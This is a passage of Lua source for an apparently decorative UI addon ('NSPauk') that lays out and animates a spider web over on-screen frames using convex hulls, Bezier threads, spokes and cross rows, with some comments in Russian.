            local r2 = dx * dx + dy * dy
            if r2 >= minCenterDist * minCenterDist then
                cells[#cells + 1] = {
                    left = left,
                    right = right,
                    bottom = bottom,
                    top = top,
                    cx = cx,
                    cy = cy,
                    angle = normAngle(math.atan2(dy, dx)),
                    r2 = r2,
                }
                if r2 > maxR2 then
                    maxR2 = r2
                end
            end
        end
    end
    if #cells == 0 then
        return nil
    end
    local chosenCells = {}
    if #cells <= targetCount then
        for _, cell in ipairs(cells) do
            chosenCells[#chosenCells + 1] = cell
        end
    else
        local usedCells = {}
        for k = 0, targetCount - 1 do
            local targetAngle = normAngle(k * twoPi / targetCount)
            local bestCell = nil
            local bestScore = nil
            for _, cell in ipairs(cells) do
                if not usedCells[cell] then
                    local diff = math.abs(cell.angle - targetAngle)
                    if diff > math.pi then
                        diff = twoPi - diff
                    end
                    local radiusScore = 0
                    if maxR2 > 0 then
                        radiusScore = cell.r2 / maxR2
                    end
                    local score = diff - radiusScore * 0.35
                    if not bestScore or score < bestScore then
                        bestScore = score
                        bestCell = cell
                    end
                end
            end
            if bestCell then
                usedCells[bestCell] = true
                chosenCells[#chosenCells + 1] = bestCell
            end
        end
    end
    if #chosenCells == 0 then
        return nil
    end
    local usedItems = {}
    local anchors = {}
    local function addItem(item)
        if not item or usedItems[item] then
            return false
        end
        usedItems[item] = true
        anchors[#anchors + 1] = item
        return true
    end
    for _, cell in ipairs(chosenCells) do
        local bestItem = nil
        local bestScore = nil
        for _, item in ipairs(pool) do
            if not usedItems[item] then
                local dx = (item.cx or 0) - cell.cx
                local dy = (item.cy or 0) - cell.cy
                local d2 = dx * dx + dy * dy
                local inside = item.cx >= cell.left
                    and item.cx <= cell.right
                    and item.cy >= cell.bottom
                    and item.cy <= cell.top
                local score = d2
                if not inside then
                    score = score + 1000000
                end
                if not bestScore or score < bestScore then
                    bestScore = score
                    bestItem = item
                end
            end
        end
        if bestItem then
            addItem(bestItem)
        end
    end
    while #anchors < targetCount do
        local added = false
        for _, item in ipairs(pool) do
            if not usedItems[item] then
                addItem(item)
                added = true
                break
            end
        end
        if not added then
            break
        end
    end
    if #anchors < 4 then
        return nil
    end
    return anchors
end

function NSPauk:NP_MakeHullEven(hull)
    if type(hull) ~= "table" or #hull < 4 then
        return nil
    end
    if #hull % 2 == 0 then
        return hull
    end
    if #hull < 5 then
        return nil
    end
    local N = #hull
    local bestIdx = nil
    local bestScore = math.huge
    for i = 1, N do
        local prev = hull[((i - 2 + N) % N) + 1]
        local cur = hull[i]
        local nxt = hull[(i % N) + 1]
        local area = math.abs(
            (cur.x - prev.x) * (nxt.y - prev.y)
            - (cur.y - prev.y) * (nxt.x - prev.x)
        )
        if area < bestScore then
            bestScore = area
            bestIdx = i
        end
    end
    if not bestIdx then
        return nil
    end
    local out = {}
    for i = 1, N do
        if i ~= bestIdx then
            out[#out + 1] = hull[i]
        end
    end
    if #out >= 4 and #out % 2 == 0 then
        return out
    end
    return nil
end

function NSPauk:NP_CollectRingAnchors(items, targetCount)
    local good = {}
    local all = {}
    for _, item in ipairs(items or {}) do
        if item and item.frame then
            if self:IsGoodAnchorName(item.name) then
                good[#good + 1] = item
            end
            all[#all + 1] = item
        end
    end
    local pool = good
    if #pool == 0 then
        pool = all
    end
    if #pool < 4 then
        return nil
    end
    targetCount = math.floor(tonumber(targetCount) or 4)
    if targetCount < 4 then
        targetCount = 4
    end
    if targetCount % 2 ~= 0 then
        targetCount = targetCount + 1
    end
    if targetCount > #pool then
        targetCount = #pool - (#pool % 2)
    end
    if targetCount < 4 then
        return nil
    end
    local bestHull = nil
    for _ = 1, 16 do
        local picked = self:NP_PickRingAnchorsOnce(pool, targetCount)
        if picked and #picked >= 4 then
            local points = {}
            for _, item in ipairs(picked) do
                points[#points + 1] = {
                    x = item.cx or 0,
                    y = item.cy or 0,
                    item = item,
                }
            end
            local hull = self:NP_ConvexHull(points)
            if hull and #hull >= 4 then
                if #hull % 2 ~= 0 then
                    hull = self:NP_MakeHullEven(hull)
                end
                if hull and #hull >= 4 and #hull % 2 == 0 then
                    if #hull == targetCount then
                        local out = {}
                        for _, p in ipairs(hull) do
                            out[#out + 1] = p.item
                        end
                        return out
                    end
                    if not bestHull or #hull > #bestHull then
                        bestHull = hull
                    end
                end
            end
        end
    end
    if bestHull then
        local out = {}
        for _, p in ipairs(bestHull) do
            out[#out + 1] = p.item
        end
        return out
    end
    return nil
end

function NSPauk:NP_MakeRingSagThread(p0, p2, mode, sagMult)
    local function cp(p)
        if not p then
            return { x = 0, y = 0 }
        end
        return {
            x = p.x or 0,
            y = p.y or 0,
        }
    end
    p0 = cp(p0)
    p2 = cp(p2)
    local thread = {
        p0 = p0,
        p2 = p2,
    }
    local dx = p2.x - p0.x
    local dy = p2.y - p0.y
    local len = math.sqrt(dx * dx + dy * dy)
    local mx = (p0.x + p2.x) / 2
    local my = (p0.y + p2.y) / 2
    if len < 1 then
        thread.p1 = {
            x = mx,
            y = my,
        }
        return thread
    end
    local C = self.C or {}
    local D = self.DefaultConstants or {}
    local minSag
    local maxSag
    local jitter
    if mode == "main" then
        minSag = tonumber(C.MAIN_SAG_MIN) or D.MAIN_SAG_MIN or 0.06
        maxSag = tonumber(C.MAIN_SAG_MAX) or D.MAIN_SAG_MAX or 0.16
        jitter = 0.05
    else
        minSag = tonumber(C.CROSS_SAG_MIN) or D.CROSS_SAG_MIN or 0.05
        maxSag = tonumber(C.CROSS_SAG_MAX) or D.CROSS_SAG_MAX or 0.13
        jitter = 0.06
    end
    if type(sagMult) ~= "number" or sagMult ~= sagMult then
        sagMult = 1
    end
    if sagMult <= 0 then
        thread.p1 = {
            x = mx,
            y = my,
        }
        return thread
    end
    local ratio = self:RandomFloat(minSag, maxSag) * sagMult
    if type(ratio) ~= "number" or ratio ~= ratio or ratio <= 0 then
        ratio = 0.08 * sagMult
    end
    local sag = len * ratio
    if type(sag) ~= "number" or sag ~= sag or sag <= 0 then
        sag = math.max(len * 0.08, 0.5)
    elseif sag < 0.5 then
        sag = 0.5
    end
    local n1x = -dy / len
    local n1y = dx / len
    local n2x = dy / len
    local n2y = -dx / len
    local nx, ny
    if n1y < n2y then
        nx = n1x
        ny = n1y
    else
        nx = n2x
        ny = n2y
    end
    if ny > -0.08 then
        local topX
        local bottomX
        if p0.y >= p2.y then
            topX = p0.x
            bottomX = p2.x
        else
            topX = p2.x
            bottomX = p0.x
        end
        if topX > bottomX then
            nx = 1
        else
            nx = -1
        end
        ny = 0
    end
    local offsetX = nx * sag
    local offsetY = ny * sag
    if ny > -0.35 then
        offsetY = offsetY - sag * 0.45
    end
    local jitterX = (math.random() - 0.5) * len * jitter * 0.25
    local jitterY = (math.random() - 0.5) * len * jitter * 0.10
    local px = mx + offsetX + jitterX
    local py = my + offsetY + jitterY
    local minPy = my - math.max(0.5, sag * 0.20)
    if py > minPy then
        py = minPy
    end
    if py < 1 then
        py = 1
    end
    thread.p1 = {
        x = px,
        y = py,
    }
    return thread
end

function NSPauk:NP_SubBezierThread(thread, u, v, reverse)
    if not thread or not thread.p0 or not thread.p1 or not thread.p2 then
        return nil
    end
    local p0x = thread.p0.x
    local p0y = thread.p0.y
    local p1x = thread.p1.x
    local p1y = thread.p1.y
    local p2x = thread.p2.x
    local p2y = thread.p2.y
    local function bez(t)
        local m = 1 - t
        return m * m * p0x + 2 * m * t * p1x + t * t * p2x,
            m * m * p0y + 2 * m * t * p1y + t * t * p2y
    end
    local x0, y0 = bez(u)
    local x2, y2 = bez(v)
    local cx = (1 - u) * (1 - v) * p0x
        + (u * (1 - v) + v * (1 - u)) * p1x
        + u * v * p2x
    local cy = (1 - u) * (1 - v) * p0y
        + (u * (1 - v) + v * (1 - u)) * p1y
        + u * v * p2y
    if reverse then
        return {
            p0 = { x = x2, y = y2 },
            p1 = { x = cx, y = cy },
            p2 = { x = x0, y = y0 },
        }
    end
    return {
        p0 = { x = x0, y = y0 },
        p1 = { x = cx, y = cy },
        p2 = { x = x2, y = y2 },
    }
end

function NSPauk:NP_ChooseOppositeRingPair(anchors)
    local N = anchors and #anchors or 0
    if N < 4 then
        return 1, 2
    end
    local half = math.floor(N / 2)
    local bestI = 1
    local bestJ = 1 + half
    if bestJ > N then
        bestJ = bestJ - N
    end
    local bestScore = -math.huge
    for i = 1, N do
        local j = i + half
        if j > N then
            j = j - N
        end
        local a = anchors[i]
        local b = anchors[j]
        if a and b then
            local dx = math.abs((a.cx or 0) - (b.cx or 0))
            local dy = math.abs((a.cy or 0) - (b.cy or 0))
            local dist = math.sqrt(dx * dx + dy * dy)
            local score = dx * 2 + dist * 0.35
            if dx >= dy then
                score = score + dist * 0.5
            end
            if score > bestScore then
                bestScore = score
                bestI = i
                bestJ = j
            end
        end
    end
    return bestI, bestJ
end

function NSPauk:NP_GetRingRowArcs(connA, connB)
    local C = self.C or {}

    local spacing = tonumber(C.CROSS_ROW_SPACING) or 20

    if spacing < 0.5 then
        spacing = 0.5
    end

    local minCross = tonumber(C.MIN_CROSS_LEN) or 4

    if minCross < 0 then
        minCross = 4
    end

    local maxRows = tonumber(C.MAX_CROSS_ROWS) or 1600

    if maxRows < 0 then
        maxRows = 1600
    end

    local lenA = tonumber(connA and connA.arcLength) or 0
    local lenB = tonumber(connB and connB.arcLength) or 0

    if lenA < 0 then
        lenA = 0
    end

    if lenB < 0 then
        lenB = 0
    end

    -- Тоже используем более длинную нить.
    local maxLen = math.max(lenA, lenB)

    local out = {}

    if maxLen < minCross then
        return out
    end

    local rows = 0
    local arcLen = spacing

    while arcLen <= maxLen and rows < maxRows do
        out[#out + 1] = arcLen
        arcLen = arcLen + spacing
        rows = rows + 1
    end

    local last = out[#out]

    if not last then
        if rows < maxRows then
            out[#out + 1] = maxLen
        end
    else
        local tail = maxLen - last

        if tail > 0.001 then
            local snapTol = spacing * 0.6

            if tail <= snapTol then
                out[#out] = maxLen
            elseif rows < maxRows then
                out[#out + 1] = maxLen
            end
        end
    end

    return out
end

function NSPauk:NP_GetRingSectors(inst)
    local out = {}

    if not inst or not inst.conns then
        return out
    end

    local C = self.C or {}

    local minCross = tonumber(C.MIN_CROSS_LEN) or 4

    if minCross < 0 then
        minCross = 4
    end

    local radial = {}

    for _, conn in ipairs(inst.conns) do
        if not conn.noSector and conn.thread then
            if not conn.arcLength or conn.arcLength <= 0 then
                local samples, total = self:BuildArcSamples(conn.thread)
                conn.arcSamples = samples
                conn.arcLength = total
            end

            radial[#radial + 1] = conn
        end
    end

    if #radial < 2 then
        return out
    end

    table.sort(radial, function(a, b)
        local aa = a.angle or 0
        local bb = b.angle or 0

        if aa == bb then
            return (a.id or 0) < (b.id or 0)
        end

        return aa < bb
    end)

    local M = #radial

    for i = 1, M do
        local connA = radial[i]
        local connB = radial[(i % M) + 1]

        if connA.alive and connB.alive then
            local lenA = tonumber(connA.arcLength) or 0
            local lenB = tonumber(connB.arcLength) or 0

            if lenA >= minCross and lenB >= minCross then
                out[#out + 1] = {
                    a = connA.id,
                    b = connB.id,
                    key = tostring(connA.id) .. "-" .. tostring(connB.id),
                    pairMin = math.min(lenA, lenB),
                }
            end
        end
    end

    return out
end

function NSPauk:NP_ChooseRingIntermediateCounts(N)
    local C = self.C or {}

    local counts = {}

    for i = 1, N do
        counts[i] = 1
    end

    if N < 1 then
        return counts
    end

    local minSetting = math.floor(tonumber(C.TARGET_COUNT_MIN) or 3)
    local maxSetting = math.floor(tonumber(C.TARGET_COUNT_MAX) or 6)

    -- Базово: N углов + N середин = 2*N сектора.
    -- Для 4 углов это 8 секторов.
    local baseSectors = 2 * N

    local minSectors = math.max(baseSectors, 8, minSetting)
    local maxSectors = math.max(minSectors, maxSetting)

    local desiredSectors = self:RandomInt(minSectors, maxSectors)

    -- Всего радиальных нитей должно быть desiredSectors.
    -- Из них N — углы, остальные — промежуточные спицы.
    local totalIntermediates = desiredSectors - N

    if totalIntermediates < N then
        totalIntermediates = N
    end

    -- Ограничение, чтобы не сделать слишком много точек.
    -- 7 промежуточных точек на сторону = до 8 сегментов на сторону.
    local maxPerSide = 7
    local maxTotal = N * maxPerSide

    if totalIntermediates > maxTotal then
        totalIntermediates = maxTotal
    end

    local remaining = totalIntermediates - N

    if remaining > 0 then
        local order = {}

        for i = 1, N do
            order[i] = i
        end

        self:Shuffle(order)

        local idx = 1
        local guard = 0

        while remaining > 0 and guard < 10000 do
            local side = order[((idx - 1) % N) + 1]

            if counts[side] < maxPerSide then
                counts[side] = counts[side] + 1
                remaining = remaining - 1
            end

            idx = idx + 1
            guard = guard + 1

            local canAddMore = false

            for i = 1, N do
                if counts[i] < maxPerSide then
                    canAddMore = true
                    break
                end
            end

            if not canAddMore then
                break
            end
        end
    end

    return counts
end

function NSPauk:NP_ConvexHull(points)
    if type(points) ~= "table" or #points < 3 then
        return {}
    end

    local pts = {}

    for _, p in ipairs(points) do
        if type(p.x) == "number"
            and type(p.y) == "number"
            and p.x == p.x
            and p.y == p.y then
            pts[#pts + 1] = p
        end
    end

    if #pts < 3 then
        return {}
    end

    table.sort(pts, function(a, b)
        if a.x == b.x then
            return a.y < b.y
        end

        return a.x < b.x
    end)

    local unique = {}

    for _, p in ipairs(pts) do
        local last = unique[#unique]

        if not last or last.x ~= p.x or last.y ~= p.y then
            unique[#unique + 1] = p
        end
    end

    if #unique < 3 then
        return {}
    end

    local function cross(o, a, b)
        return (a.x - o.x) * (b.y - o.y)
             - (a.y - o.y) * (b.x - o.x)
    end

    local lower = {}

    for _, p in ipairs(unique) do
        while #lower >= 2
            and cross(lower[#lower - 1], lower[#lower], p) <= 0 do
            table.remove(lower)
        end

        lower[#lower + 1] = p
    end

    local upper = {}

    for i = #unique, 1, -1 do
        local p = unique[i]

        while #upper >= 2
            and cross(upper[#upper - 1], upper[#upper], p) <= 0 do
            table.remove(upper)
        end

        upper[#upper + 1] = p
    end

    table.remove(lower)
    table.remove(upper)

    for _, p in ipairs(upper) do
        lower[#lower + 1] = p
    end

    if #lower < 3 then
        return {}
    end

    return lower
end

function NSPauk:NP_MakeGravityThread(p0, p2, mode, sagMult)
    local function cp(p)
        if not p then
            return { x = 0, y = 0 }
        end

        return {
            x = p.x or 0,
            y = p.y or 0,
        }
    end

    p0 = cp(p0)
    p2 = cp(p2)

    local thread = {
        p0 = p0,
        p2 = p2,
    }

    local mx = (p0.x + p2.x) / 2
    local my = (p0.y + p2.y) / 2

    local dx = p2.x - p0.x
    local dy = p2.y - p0.y
    local len = math.sqrt(dx * dx + dy * dy)

    if len < 1 then
        thread.p1 = {
            x = mx,
            y = my,
        }

        return thread
    end

    local C = self.C or {}
    local D = self.DefaultConstants or {}

    local minSag
    local maxSag
    local jitter

    if mode == "main" then
        minSag = tonumber(C.MAIN_SAG_MIN) or D.MAIN_SAG_MIN or 0.06
        maxSag = tonumber(C.MAIN_SAG_MAX) or D.MAIN_SAG_MAX or 0.16
        jitter = 0.06
    else
        minSag = tonumber(C.CROSS_SAG_MIN) or D.CROSS_SAG_MIN or 0.05
        maxSag = tonumber(C.CROSS_SAG_MAX) or D.CROSS_SAG_MAX or 0.13
        jitter = 0.08
    end

    if type(sagMult) ~= "number" or sagMult ~= sagMult then
        sagMult = 1
    end

    if sagMult <= 0 then
        thread.p1 = {
            x = mx,
            y = my,
        }

        return thread
    end

    local ratio = self:RandomFloat(minSag, maxSag) * sagMult

    if type(ratio) ~= "number" or ratio ~= ratio or ratio <= 0 then
        ratio = 0.08 * sagMult
    end

    local sag = len * ratio

    if sag < 0.5 then
        sag = 0.5
    end

    local nx = dx / len
    local ny = dy / len

    local gx = 0
    local gy = -1

    local dot = nx * gx + ny * gy

    local px = gx - dot * nx
    local py = gy - dot * ny

    local plen = math.sqrt(px * px + py * py)

    local dirX
    local dirY

    if plen > 0.08 then
        dirX = px / plen
        dirY = py / plen
    else

        dirX = (math.random() - 0.5) * 0.8
        dirY = 0

        local dl = math.abs(dirX)

        if dl > 0.01 then
            dirX = dirX / dl
        else
            dirX = 0.5
        end

        sag = sag * 0.35
    end

    local jitterX = (math.random() - 0.5) * len * jitter * 0.35
    local jitterY = (math.random() - 0.5) * len * jitter * 0.15

    thread.p1 = {
        x = mx + dirX * sag + jitterX,
        y = my + dirY * sag + jitterY,
    }

    if thread.p1.y > my then
        thread.p1.y = my - math.max(0.5, sag * 0.25)
    end

    if thread.p1.y < 1 then
        thread.p1.y = 1
    end

    return thread
end

function NSPauk:NP_PointInRingPolygon(x, y, anchors)
    if type(anchors) ~= "table" or #anchors < 3 then
        return false
    end

    local N = #anchors
    local pos = 0
    local neg = 0

    for i = 1, N do
        local a = anchors[i]
        local b = anchors[(i % N) + 1]

        if not a or not b then
            return false
        end

        local ax = a.cx or 0
        local ay = a.cy or 0
        local bx = b.cx or 0
        local by = b.cy or 0

        local cross = (bx - ax) * (y - ay) - (by - ay) * (x - ax)

        if cross > 0.01 then
            pos = pos + 1
        elseif cross < -0.01 then
            neg = neg + 1
        end

        if pos > 0 and neg > 0 then
            return false
        end
    end

    return true
end

function NSPauk:NP_ChooseRingDiameter(anchors)
    local N = anchors and #anchors or 0

    if N < 2 then
        return 1, 2
    end

    local bestScore = -math.huge
    local bestA = 1
    local bestB = 2

    for i = 1, N do
        for j = i + 1, N do
            local a = anchors[i]
            local b = anchors[j]

            if a and b then
                local dx = math.abs((a.cx or 0) - (b.cx or 0))
                local dy = math.abs((a.cy or 0) - (b.cy or 0))
                local dist = math.sqrt(dx * dx + dy * dy)

                local score = dx * 2 + dist * 0.35

                if dx >= dy then
                    score = score + dist * 0.5
                end

                local idxDist = math.min(j - i, N - (j - i))
                local ideal = N / 2

                if ideal <= 0 then
                    ideal = 1
                end

                local opposite = 1 - math.abs(idxDist - ideal) / ideal

                if opposite < 0 then
                    opposite = 0
                end

                score = score + opposite * 120

                if score > bestScore then
                    bestScore = score
                    bestA = i
                    bestB = j
                end
            end
        end
    end

    return bestA, bestB
end

function NSPauk:CreateRingInstance(targetCount, items)
    local S = self.S
    local C = self.C

    if type(self.NP_CollectRingAnchors) ~= "function"
        or type(self.NP_ConvexHull) ~= "function" then
        return nil
    end

    targetCount = math.floor(tonumber(targetCount) or 4)

    if targetCount < 4 then
        targetCount = 4
    end

    if targetCount % 2 ~= 0 then
        targetCount = targetCount + 1
    end

    if not items then
        items = self:CollectVisibleItems()
    end

    local anchors = self:NP_CollectRingAnchors(items, targetCount)

    if not anchors or #anchors < 4 then
        return nil
    end

    for i = #anchors, 1, -1 do
        if not self:ValidateAnchorRect(anchors[i]) then
            table.remove(anchors, i)
        end
    end

    if #anchors < 4 then
        return nil
    end

    if #anchors % 2 ~= 0 then
        table.remove(anchors)
    end

    local N = #anchors

    if N < 4 then
        return nil
    end

    local points = {}

    for _, item in ipairs(anchors) do
        points[#points + 1] = {
            x = item.cx or 0,
            y = item.cy or 0,
            item = item,
        }
    end

    local hull = self:NP_ConvexHull(points)

    if not hull or #hull < 4 then
        return nil
    end

    if #hull % 2 ~= 0 then
        table.remove(hull)
    end

    if #hull < 4 then
        return nil
    end

    anchors = {}

    for _, p in ipairs(hull) do
        anchors[#anchors + 1] = p.item
    end

    N = #anchors

    local idxA = 1
    local idxB = 1 + math.floor(N / 2)

    local a = anchors[idxA]
    local b = anchors[idxB]

    if not a or not b then
        return nil
    end

    local diamThread = self:NP_MakeGravityThread(
        { x = a.cx or 0, y = a.cy or 0 },
        { x = b.cx or 0, y = b.cy or 0 },
        "main",
        1.0
    )

    local hx, hy = self:BzThread(diamThread, 0.5)

    local hubRect = self:NormalizeFallbackRect({
        name = "RingHub",
        left = hx - 16,
        right = hx + 16,
        bottom = hy - 16,
        top = hy + 16,
    })

    local inst = {
        id = self.nextInstanceId,
        isRing = true,
        isNaturalRing = true,
        hub = {
            frame = nil,
            name = "RingHub",
            rect = hubRect,
        },
        conns = {},
        crossSegs = {},
        interSegs = {},
        crossRowsList = {},
        webSectors = {},
        tasks = {},
        crossRows = 0,
        anchorCandidates = {},
        drawnPoints = 0,
        settled = false,
    }

    self.nextInstanceId = self.nextInstanceId + 1

    inst.anchorCandidates[#inst.anchorCandidates + 1] = self:CopyRect(hubRect)

    local perimeterThreads = {}
    local perimeterConns = {}

    for i = 1, N do
        local p = anchors[i]
        local q = anchors[(i % N) + 1]

        local thread = self:NP_MakeGravityThread(
            { x = p.cx or 0, y = p.cy or 0 },
            { x = q.cx or 0, y = q.cy or 0 },
            "main",
            1.0
        )

        local angle = math.atan2(
            (q.cy or 0) - (p.cy or 0),
            (q.cx or 0) - (p.cx or 0)
        )

        if angle < 0 then
            angle = angle + 2 * math.pi
        end

        thread.angle = angle

        local conn = {
            id = #inst.conns + 1,
            target = {
                frame = q.frame,
                name = q.name,
                rect = self:CopyRect(q),
            },
            ringStartRect = self:CopyRect(p),
            thread = thread,
            angle = angle,
            textures = {},
            alive = true,
            noSector = true,
            isRingFrame = true,
        }

        thread.ownerRef = {
            inst = inst,
            conn = conn,
        }

        inst.conns[#inst.conns + 1] = conn
        inst.anchorCandidates[#inst.anchorCandidates + 1] = self:CopyRect(q)

        perimeterThreads[#perimeterThreads + 1] = thread
        perimeterConns[i] = conn
    end

    local diamAngle = math.atan2(
        (b.cy or 0) - (a.cy or 0),
        (b.cx or 0) - (a.cx or 0)
    )

    if diamAngle < 0 then
        diamAngle = diamAngle + 2 * math.pi
    end

    diamThread.angle = diamAngle

    local diamConn = {
        id = #inst.conns + 1,
        target = {
            frame = b.frame,
            name = b.name,
            rect = self:CopyRect(b),
        },
        ringStartRect = self:CopyRect(a),
        thread = diamThread,
        angle = diamAngle,
        textures = {},
        alive = true,
        noSector = true,
        isDiameter = true,
    }

    diamThread.ownerRef = {
        inst = inst,
        conn = diamConn,
    }

    inst.conns[#inst.conns + 1] = diamConn
    inst.hubDepConn = diamConn

    -- Спицы от хаба к углам.
    for i = 1, N do
        local anchor = anchors[i]

        local thread = self:NP_MakeGravityThread(
            { x = hx, y = hy },
            { x = anchor.cx or 0, y = anchor.cy or 0 },
            "cross",
            0.35
        )

        local angle = math.atan2(
            (anchor.cy or 0) - hy,
            (anchor.cx or 0) - hx
        )

        if angle < 0 then
            angle = angle + 2 * math.pi
        end

        thread.angle = angle

        local conn = {
            id = #inst.conns + 1,
            target = {
                frame = anchor.frame,
                name = anchor.name,
                rect = self:CopyRect(anchor),
            },
            ringStartRect = self:CopyRect(hubRect),
            thread = thread,
            angle = angle,
            textures = {},
            alive = true,
            isSpoke = true,
            hubDepConn = diamConn,
        }

        thread.ownerRef = {
            inst = inst,
            conn = conn,
        }

        inst.conns[#inst.conns + 1] = conn
    end

    -- Промежуточные спицы от хаба к точкам на внешних линиях.
    -- Количество точек на каждой внешней линии выбирается рандомно
    -- в зависимости от TARGET_COUNT_MIN / TARGET_COUNT_MAX.
    local intermediateCounts = self:NP_ChooseRingIntermediateCounts(N)

    for i = 1, N do
        local pThread = perimeterThreads[i]
        local perConn = perimeterConns[i]

        local count = intermediateCounts[i] or 1

        if count < 1 then
            count = 1
        end

        for k = 1, count do
            local t = k / (count + 1)

            local midX, midY = self:BzThread(pThread, t)

            local thread = self:NP_MakeGravityThread(
                { x = hx, y = hy },
                { x = midX, y = midY },
                "cross",
                0.35
            )

            local angle = math.atan2(midY - hy, midX - hx)

            if angle < 0 then
                angle = angle + 2 * math.pi
            end

            thread.angle = angle

            local conn = {
                id = #inst.conns + 1,
                target = {
                    frame = nil,
                    name = "MidPerimeter",
                    rect = nil,
                },
                ringStartRect = self:CopyRect(hubRect),
                thread = thread,
                angle = angle,
                textures = {},
                alive = true,
                isSpoke = true,
                isMidSpoke = true,
                perimeterConn = perConn,
                hubDepConn = diamConn,
            }

            thread.ownerRef = {
                inst = inst,
                conn = conn,
            }

            inst.conns[#inst.conns + 1] = conn
        end
    end

    self:BuildInstanceTasks(inst)

    return inst
end

function NSPauk:NP_BuildNaturalRingMainTasks(inst, tasks, cursorPoint)
    if not inst or not tasks then
        return cursorPoint
    end

    local cursor = cursorPoint

    local perimeter = {}
    local diameter = nil
    local spokes = {}

    for _, conn in ipairs(inst.conns or {}) do
        if conn.isRingFrame then
            perimeter[#perimeter + 1] = conn
        elseif conn.isDiameter then
            diameter = conn
        elseif conn.isSpoke then
            spokes[#spokes + 1] = conn
        end
    end

    table.sort(spokes, function(a, b)
        local aa = a.angle or 0
        local bb = b.angle or 0

        if aa == bb then
            return (a.id or 0) < (b.id or 0)
        end

        return aa < bb
    end)

    for _, conn in ipairs(perimeter) do
        local drawThread = self:NP_OrientThreadForCursor(conn.thread, cursor) or conn.thread

        if cursor then
            self:AddTravelPointTask(tasks, cursor, drawThread.p0, conn, conn)
        end

        local task = self:AddThreadTask(tasks, conn, drawThread)

        if task then
            task.isMain = true

            cursor = {
                x = drawThread.p2.x,
                y = drawThread.p2.y,
            }
        end
    end

    if diameter then
        local drawThread = self:NP_OrientThreadForCursor(diameter.thread, cursor) or diameter.thread

        if cursor then
            self:AddTravelPointTask(tasks, cursor, drawThread.p0, diameter, diameter)
        end

        local task = self:AddThreadTask(tasks, diameter, drawThread)

        if task then
            task.isMain = true

            cursor = {
                x = drawThread.p2.x,
                y = drawThread.p2.y,
            }
        end
    end

    for _, conn in ipairs(spokes) do
        local drawThread = self:NP_OrientThreadForCursor(conn.thread, cursor) or conn.thread

        if cursor then
            self:AddTravelPointTask(tasks, cursor, drawThread.p0, conn, conn)
        end

        local task = self:AddThreadTask(tasks, conn, drawThread)

        if task then
            task.isMain = true

            cursor = {
                x = drawThread.p2.x,
                y = drawThread.p2.y,
            }
        end
    end

    return cursor
end

function NSPauk:AddTravelPointTask(tasks, from, to, conn, owner)
    if not from or not to then
        return nil
    end

    local dx = to.x - from.x
    local dy = to.y - from.y

    if (dx * dx + dy * dy) < 36 then
        return nil
    end

    local inst = self:GetOwnerInstance(owner)
    if not inst and conn then
        inst = self:GetOwnerInstance(conn)
    end

    if inst and inst.isCocoon then
        local task = {
            kind = "travel",
            conn = conn,
            owner = owner,
            drop = false,
            p0 = { x = from.x, y = from.y },
            p1 = { x = (from.x + to.x) / 2, y = (from.y + to.y) / 2 },
            p2 = { x = to.x, y = to.y },
            nspNoInsert = true,
            nspNoSupportCheck = true,
            nspCocoon = true,
        }

        tasks[#tasks + 1] = task

        return task
    end

    local task = {
        kind = "travel",
        conn = conn,
        owner = owner,
        drop = false,
        p0 = { x = from.x, y = from.y },
        p1 = { x = (from.x + to.x) / 2, y = (from.y + to.y) / 2 },
        p2 = { x = to.x, y = to.y },
        nspPlan = true,
        nspNoInsert = true,
    }

    tasks[#tasks + 1] = task

    return task
end

function NSPauk:AddThreadTask(tasks, owner, thread)
    if not owner or not thread then
        return nil
    end

    local inst = self:GetOwnerInstance(owner)

    if inst and inst.isCocoon then
        local task = {
            kind = "thread",
            owner = owner,
            drop = true,
            p0 = thread.p0,
            p1 = thread.p1 or {
                x = (thread.p0.x + thread.p2.x) / 2,
                y = (thread.p0.y + thread.p2.y) / 2,
            },
            p2 = thread.p2,
            isCross = owner.connA ~= nil,
            nspNoInsert = true,
            nspNoSupportCheck = true,
            nspCocoon = true,
        }

        tasks[#tasks + 1] = task

        return task
    end

    local task = {
        kind = "thread",
        owner = owner,
        drop = false,
        p0 = thread.p0,
        p1 = thread.p1,
        p2 = thread.p2,
        nspPlan = true,
        nspDrag = true,
        nspNoInsert = true,
    }

    task.isCross = owner.connA ~= nil

    task.finalThread = {
        p0 = { x = thread.p0.x, y = thread.p0.y },
        p1 = thread.p1 and { x = thread.p1.x, y = thread.p1.y } or {
            x = (thread.p0.x + thread.p2.x) / 2,
            y = (thread.p0.y + thread.p2.y) / 2,
        },
        p2 = { x = thread.p2.x, y = thread.p2.y },
    }

    if thread.ownerRef then
        task.finalThread.ownerRef = thread.ownerRef
    end

    tasks[#tasks + 1] = task

    return task
end

function NSPauk:NP_IsWebOwnerDrawn(owner)
    if not owner or not owner.alive then
        return false
    end

    if owner.virtualDrawn then
        return true
    end

    if owner.isDiameterHalf and owner.hubDepConn then
        local dep = owner.hubDepConn

        return dep.alive
            and dep.textures ~= nil
            and #dep.textures > 0
    end

    return owner.textures ~= nil and #owner.textures > 0
end

function NSPauk:NP_RequestSectorRecheck(inst)
    local S = self.S

    if not inst or inst.torn then
        return
    end

    if inst.isCocoon or inst.isMoth then
        return
    end

    S.nspSectorRecheckPending = true
    S.nspSectorRecheckInst = inst
end

function NSPauk:NP_CollectScheduledOwners()
    local S = self.S
    local scheduled = {}

    local function mark(task)
        if task and task.owner then
            scheduled[task.owner] = true
        end
    end

    mark(S.currentTask)

    if type(S.tasks) == "table" then
        local start = tonumber(S.taskIdx) or 1
        if start < 1 then
            start = 1
        end

        for i = start, #S.tasks do
            mark(S.tasks[i])
        end
    end

    return scheduled
end

function NSPauk:NP_RecheckWebSectors(inst)
    local S = self.S
    local C = self.C

    if not inst or inst.torn then
        return 0
    end

    if inst.isCocoon or inst.isMoth then
        return 0
    end

    if S.phase ~= "task" and S.phase ~= "instanceComplete" then
        return 0
    end

    if inst.isNaturalRing then
        self:NP_RequestRingQueueRebuild(inst, nil)
        return 0
    end

    if S.nspSectorRecheckRunning then
        local now = GetTime()

        if type(S.nspSectorRecheckLockAt) ~= "number"
            or (now - S.nspSectorRecheckLockAt) > 3 then
            S.nspSectorRecheckRunning = false
        else
            return 0
        end
    end

    S.nspSectorRecheckRunning = true
    S.nspSectorRecheckLockAt = GetTime()

    local N = inst.conns and #inst.conns or 0

    if N < 2 then
        S.nspSectorRecheckRunning = false
        return 0
    end

    local spacing = tonumber(C.CROSS_ROW_SPACING) or 20
    if spacing < 0.5 then
        spacing = 0.5
    end

    local minCross = tonumber(C.MIN_CROSS_LEN) or 4
    if minCross < 0 then
        minCross = 4
    end

    local sectors = self:NP_GetValidTriangleSectors(inst)
